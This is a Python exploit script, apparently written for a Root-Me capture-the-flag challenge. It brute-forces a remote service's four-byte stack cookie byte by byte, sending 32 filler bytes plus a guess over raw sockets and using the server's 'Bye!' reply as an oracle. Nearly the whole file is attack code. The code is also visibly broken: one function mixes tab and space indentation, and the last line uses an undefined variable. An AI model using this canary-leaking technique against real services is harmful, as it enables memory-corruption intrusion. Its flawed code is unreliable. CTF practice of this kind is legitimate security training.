import re
import time
import struct
import socket
import binascii


HOST = 'challenge03.root-me.org'
PORT = 56542
# HOST = 'localhost'
# PORT = 9090
LEN = 1024


def hash(s):
    if len(s) == 0:
        return 0
    return int(binascii.hexlify(s),16)

def unhash(i):
    t = hex(i).replace('0x','').replace('L','')
    if len(t)%2 == 1:
        t = '0'+t
    return binascii.unhexlify(t)

def print_map(m):
    for i in m:
        for j in m[i]:
            print(i,unhash(j),m[i][j])

answers = {}

def update_map(l,buf):
    if answers.get(l) is None:
        answers[l] = {}
        answers[l][hash(buf)] = 1
    elif answers[l].get(hash(buf)) is None:
        answers[l][hash(buf)] = 1
    else:
        answers[l][hash(buf)] += 1

def test(input,s):
    s.recv(LEN)
    s.send(input)
    tmp = s.recv(LEN)

    if re.search('Bye!',tmp) is not None:
        return 'Bye'
    elif re.search('\n(.+)',tmp) is not None:
        return re.search('\n(.+)',tmp).group(1)
    try:
        buf = s.recv(LEN)
        if len(buf) == 0:
            buf = s.recv(LEN)
        elif re.search('Bye!',buf) is not None:
            return 'Bye'
        return buf
    except:
        return "Exception!"

def basic_get(input):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.recv(LEN)
    s.send(input)

	tmp = binascii.hexlify(s.recv(LEN))
	tmp2 = tmp.split('0a')
	if len(tmp2[1])>0:
		t = tmp2[1]
	else:
		t = binascii.hexlify(s.recv(LEN))
    return t


def consequence(input,s):
    s.recv(LEN)
    time.sleep(0.001)
    s.send(input)
    time.sleep(0.001)
    tmp = s.recv(LEN)
    time.sleep(0.01)
    bypass = False
    if re.search('Bye!',tmp) is not None:
        bypass = True
    try:
        if not bypass:
            buf = s.recv(LEN)
            if len(buf) == 0:
                buf = s.recv(LEN)
        else:
            buf = 'Bye!\n'
        update_map(len(input),buf)
    except:
        buf = "Exception!"
        update_map(len(input),buf)

def leak_cookie(n):
    letters = []
    for i in range(1,ord('\n')):
        letters.append(chr(i))
    for i in range(ord('\n')+1,256):
        letters.append(chr(i))
    letters.append('\x00')
    letters.append('\n')

    cookie = ''
    for j in range(4):
        found = False
        i = 0
        while not found and i<256:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            if test('i'*n+cookie+letters[i],s) == 'Bye':
                found = True
                cookie += letters[i]
            s.close()
            i += 1
            time.sleep(0.01)

        if i<256:
            print("Found ! cur cookie = "+cookie)
            print(binascii.hexlify(cookie))

    return cookie


# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect((HOST, PORT))
# s.recv(LEN)
# s.send(input)

cur_cookie = leak_cookie(32)
cur_string = "a"*n+cur_cookie